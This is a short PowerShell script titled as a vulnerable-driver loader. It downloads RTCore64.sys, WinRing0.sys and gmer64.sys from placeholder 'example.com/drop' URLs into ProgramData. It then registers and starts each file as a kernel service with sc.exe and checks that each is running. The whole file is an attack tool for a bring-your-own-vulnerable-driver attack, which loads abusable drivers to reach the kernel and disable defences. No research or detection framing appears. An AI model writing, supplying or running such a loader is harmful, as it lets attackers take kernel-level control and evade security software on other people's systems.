# LOLDDriver Triple Loader PowerShell Script
# Purpose: Drop, install, and run RTCore64.sys, WinRing0.sys, and Gmer.sys

$Drivers = @(
    @{ Name = "RTCore64"; Url = "https://example.com/drop/RTCore64.sys" },
    @{ Name = "WinRing0"; Url = "https://example.com/drop/WinRing0.sys" },
    @{ Name = "Gmer"; Url = "https://example.com/drop/gmer64.sys" }
)

foreach ($driver in $Drivers) {
    $DriverName = $driver.Name
    $DriverPath = "$env:ProgramData\$DriverName.sys"
    $RemoteDriverURL = $driver.Url

    Write-Host "[+] Downloading $DriverName.sys..."
    try {
        Invoke-WebRequest -Uri $RemoteDriverURL -OutFile $DriverPath -UseBasicParsing
        if (Test-Path $DriverPath) {
            Write-Host "[+] Saved to $DriverPath"
        } else {
            Write-Error "[-] File not found after download: $DriverPath"
            continue
        }
    } catch {
        Write-Error "[-] Failed to download $DriverName from $RemoteDriverURL: $_"
        continue
    }

    Write-Host "[+] Creating $DriverName service..."
    $createResult = sc.exe create $DriverName binPath= $DriverPath type= kernel start= demand 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Error "[-] Failed to create service $DriverName: $createResult"
        continue
    }

    Write-Host "[+] Starting $DriverName driver..."
    $startResult = sc.exe start $DriverName 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Error "[-] Failed to start service $DriverName: $startResult"
        continue
    }

    Start-Sleep -Seconds 1
    $status = sc.exe query $DriverName
    if ($status -like "*RUNNING*") {
        Write-Host "[+] $DriverName loaded successfully."
    } else {
        Write-Error "[-] $DriverName failed to load. Status: $status"
    }
    Write-Host "-----------------------------"
}

Write-Host "[!] All drivers processed. Check load status with 'driverquery' or 'fltmc'."
